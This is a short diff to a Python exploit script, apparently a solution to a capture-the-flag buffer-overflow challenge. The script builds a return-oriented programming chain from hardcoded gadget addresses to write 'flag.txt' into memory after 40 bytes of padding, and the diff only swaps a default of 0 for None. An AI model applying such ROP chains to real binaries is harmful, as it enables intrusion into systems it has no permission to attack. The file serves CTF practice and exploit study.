@@ -209,7 +209,7 @@ def set_rdi(val):
     payload = p64(0x004006a3) + p64(val)
     return payload
 
-def copy_byte(ch, src, dst = 0):
+def copy_byte(ch, src, dst = None):
     global CURRENT_AL
     xlat = 0x00400628
     stos = 0x00400639
@@ -217,7 +217,7 @@ def copy_byte(ch, src, dst = 0):
     # $rdi is auto incremented, we only have to set it the first time
     # this is neat, as it also saves us some quad words, our entire payload
     # mustn't be bigger than 512 bytes!
-    if dst != 0:
+    if dst is not None:
         payload += set_rdi(dst)
     payload += p64(stos)
     CURRENT_AL = ch # DON'T FORGET TO UPDATE $AL
@@ -226,7 +226,7 @@ def copy_byte(ch, src, dst = 0):
 BSS = 0x00601038 # .bss
 #       f           l           a           g           .           t           x           t
 srcs = [0x004003c4, 0x004003c5, 0x004003d6, 0x004007a0, 0x00400553, 0x00400192, 0x00400725, 0x00400192]
-dsts = [BSS,        0,          0,          0,          0,          0,          0,          0]
+dsts = [BSS,        None,       None,       None,       None,       None,       None,       None]
 
 payload = b'A'*40
 for i, c in enumerate(b'flag.txt'):
